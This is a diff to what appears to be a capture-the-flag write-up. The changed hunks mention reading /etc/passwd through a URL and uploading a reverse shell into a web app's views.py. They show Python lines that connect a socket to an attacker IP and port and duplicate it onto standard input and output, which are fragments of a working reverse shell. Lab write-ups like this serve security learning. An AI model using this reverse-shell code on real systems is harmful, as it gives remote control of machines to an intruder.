@@ -14,7 +14,7 @@ so getting the following URL gives us `/etc/passwd`
 
 ### Reverse shell
 
-uploaded a `reverseshell.py` into /app/app/views.py
+uploaded a `reverseshell.py` into `/app/app/views.py`
 
 ~~~
 import os
@@ -59,7 +59,7 @@ def send_report(path):
 
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.10.14.101",3948)) 
+s.connect(("10.10.14.101",3984)) 
 dup2(s.fileno(),0) 
 dup2(s.fileno(),1) 
 dup2(s.fileno(),2) 
